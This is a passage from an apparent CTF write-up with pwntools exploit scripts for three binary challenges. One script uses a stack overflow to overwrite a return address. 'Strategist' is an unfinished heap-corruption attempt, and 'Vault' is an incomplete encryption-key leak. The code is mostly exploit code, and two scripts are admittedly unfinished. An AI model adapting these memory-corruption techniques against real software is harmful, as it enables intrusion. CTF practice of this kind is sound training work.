        return base, off
    else:
        print(resp)
        print('[!] Failed at offset ' + hex(off))
        return


def rebase_pointer_lsb(offset_to_verified, lsb):
    if not(0x10 <= offset_to_verified + OFF_VERIFIED_TO_LSB < 0x110 and \
           0x10 <= offset_to_verified <= 0x110):
        raise Exception('rip bro im lazy splitting the work')

    p.sendline(b'2')
    print(p.recvuntil(b'reason again please: '))
    p.sendline(b'A'*(offset_to_verified-0x10) + p32(-1, signed=True) + p8(lsb))





if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    args = parser.parse_args()

    if args.command == 'local':
        p = process(context.binary.path)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    binary = ELF(context.binary.path)
    libc = ELF("./glibc/libc.so.6")
    rop = ROP(binary)

    #gdb.attach(p, f"b *&main+0x58c")
    #gdb.attach(p)

    input('[continue]')
    print('[*] setting name')
    p.recvuntil(b'What is your name?\n\n> ')
    p.send(b'N'*16)

    print('[*] setting reason')
    p.recvuntil(b'want to join me?\n\n> ')
    p.send(b'R'*256)

    print('[*] setting age')
    p.recvuntil(b'age again?\n\n> ')
    p.sendline(b'-1')


    input('[continue]')
    p.recvuntil(b'in combat?\n\n> ')
    p.send(b'C'*16)
    
    print(p.recvuntil(b'[Specialty]: ' + b'C'*16))
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    print('[+] leak             : ' + hex(leak))

    binary.address = leak - binary.symbols.__libc_csu_init

    print('[+] binary base      : ' + hex(binary.address))
    print('[+] @win             : ' + hex(binary.symbols.contract))

    print('[*] setting specialty')
    p.recvuntil(b'Specialty\n\n> ')
    p.sendline(b'4')

    print(p.recvuntil(b'you good at: ').decode())
    off_to_verified = 28
    off_to_self = off_to_verified + 4
    
    p.sendline(b'O'*off_to_verified + p32(-100, signed=True) + b'\xf0') # override `verified`
                                                # so we can continue to modify fields
                                                # (and trigger the BOF as well !)
                                                # we should set it to 0 when we 
                                                # are ready to exploit

    # landed, now enumerate
    offset = 0
    while offset < 0x128:
        ret = try_override_verified(offset)
        if ret != None:
            base, offset = ret
            break
        offset += 4

    off_to_ret = 0x118-(offset+OFF_VERIFIED_TO_RET)
    rebased_lsb = 0xf0-(0x118-(offset+OFF_VERIFIED_TO_RET))
    print(f'[?] return address is {off_to_ret} far from `specialization` field')
    print('[+] setting pointer LSB to', hex(rebased_lsb))
    
    input('[Type ENTER to rebase pointer]')
    p.sendline(b'no')
    #p.interactive()
    rebase_pointer_lsb(offset, rebased_lsb)
    print('[+] pointer rebased ! overwriting return address from `specialization` field')

    input('[Type ENTER to overwrite return address]')
    p.sendline(b'4')
    p.sendline(p64(binary.symbols.contract))
    
    p.sendline(b'Yes')

    p.interactive()
```

## PWN - Strategist

**_Work In Progress_**

```python
from pwn import *
import argparse
import time

def create_plan(data, size=None):
    p.sendline(b'1')
    p.recvuntil(b'your plan?\n\n> ', timeout=0.5)
    size = size or len(data)
    print(f'[+] Creating plan of size {size}')
    p.sendline(f'{size}'.encode())
    resp = p.recv(timeout=0.5)
    if b"grand failure" in resp:
        print('malloc failed!')
        exit(1)
    time.sleep(0.05)
    p.send(data)
    p.recvuntil(b'in mind.\n\n')

def show_plan(id):
    p.sendline(b'2')
    p.recvuntil(b'to view?\n\n> ')
    p.sendline(f"{id}".encode())
    resp = p.recv(timeout=0.5)
    if b'no such plan' in resp:
        print(f'Invalid plan to show {id}')
        return
    else:
        print(resp)
        start = resp.find(f"Plan [{id}]: ".encode())
        if start != -1:
            end = resp.find(b'\n', start)
            return resp[start+len(f"Plan [{id}]: ".encode()): end]
        


def delete_plan(id):
    p.sendline(b'4')
    p.recvuntil(b'to delete?\n\n> ')
    p.sendline(f"{id}".encode())
    resp = p.recv(timeout=0.5)
    if b'no such plan' in resp:
        print(f'Invalid plan to delete {id}')
        return

def edit_plan(id, data):
    p.sendline(b'3')
    p.recvuntil(b'to change?\n\n> ')
    p.sendline(f"{id}".encode())
    resp = p.recv(timeout=0.5)
    if b"no such plan" in resp:
        print(f'Invalid plan to edit {id}')
        exit(1)
    elif b'your new plan.\n\n> ' in resp:
        print('[+] Writing new plan')
        time.sleep(0.05)
        print(f'[+] Sending new plan (content={data})')
        p.send(data)
        p.recvline()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    parser.add_argument('-b', '--binary', help='local binary path', required=True)
    parser.add_argument('-l', '--libc', help='local libc path', required=True) # remove if libc not needed

    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary, env={'LD_LIBRARY_PATH': os.path.dirname(args.libc)})
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    binary = ELF(args.binary)
    libc = ELF(args.libc)
    rop = ROP(binary)

    create_plan(b'A'*24)
    create_plan(b'A'*0x508)
    create_plan(b'A'*24)
    create_plan(b'A'*0x4c8)
    create_plan(b'A'*24)
    gdb.attach(p)
    input('Start exploit')
    delete_plan(1)
    edit_plan(0, b"A"*24 + p16((0x550 & 0xfffc) | 1))
    input('Start exploit')
    edit_plan(3, b'A'*0x10 + p64(0x550 & 0xfffffffc) )
    input('Start exploit')
    size = 0x538
    create_plan(b"A"*0x548)
    delete_plan(3)
    #edit_plan(1, b"A"*0x508)
    #leak = u64(show_plan(1)[0x518:].ljust(8, b"\x00"))
    #print('pointer into main arena = ',hex(leak))

    #libc.address = leak - 0x3EBC40
    #libc.address = leak - libc.symbols["__malloc_hook"] + 0x10
    #print('libc base = ',hex(libc.address))


    p.interactive()
```

## PWN - Vault

Did not have time to pwn this challenge. I started working at the end of the event and found interesting things, but not enough to pwn it yet. I might continue this challenge and post write-up.

```python
from pwn import *
import argparse

context.binary = './vault'

def _leak_encryption_key(byte_idx, idx):
    p.recvuntil(b'> ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'URL: ')
    url = b'http://' + b'A'*128 + b':'
    p.sendline(url)
    p.recvuntil(b'Password: ')
    plain = b'A'*byte_idx + b'B' + b'A'*(64-byte_idx-1) 
    p.sendline(plain)

    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(b'0')
    leak = p.recvline()
    leak_start = leak.find(b'A'*128) + 128
    key = bytes([ plain[i] ^ leak[i] for i in range(len(leak[leak_start:-1]))])
    p.recvline()
    return key


def leak_encryption_key():
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(b'0')
    leak = p.recvline()
    leak_start = leak.find(b'A'*128) + 128
    key = bytes([ 0x41 ^ l for l in leak[leak_start:-1]])
    p.recvline()
    idx = 1
    while len(key) < 64:
        print('[*] Retrying leak')
        key = _leak_encryption_key(len(key), idx)
        idx += 1
    return key


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    parser.add_argument('-b', '--binary', help='local binary path', required=True)
    parser.add_argument('-l', '--libc', help='local libc path', required=True) # remove if libc not needed

    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)

    binary = ELF(args.binary)
    libc = ELF(args.libc)
    rop = ROP(binary)

    url = b'http://' + b'A'*128 + b':'
    
    print('[+] Creating malformed entry')
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'URL: ')
    p.sendline(url)
    p.recvuntil(b'Password: ')
    p.sendline(b'A'*64)

    print('[+] Leaking encryption key')
    key = leak_encryption_key()
    assert len(key) == 64
    print(key)

    gdb.attach(p)

    input('[Type ENTER to continue]')
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'URL: ')
    p.sendline(url)
    p.recvuntil(b'Password: ')
    p.sendline(b'A'*255) # make program crash if no null byte while reading

    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(b'1')
    #p.recvuntil(b'Password: ')
    #leak = u64(p.recvline().replace(b'A'*128, b'').ljust(8, b'\x00'))
    #print(hex(leak))

    p.interactive()
```
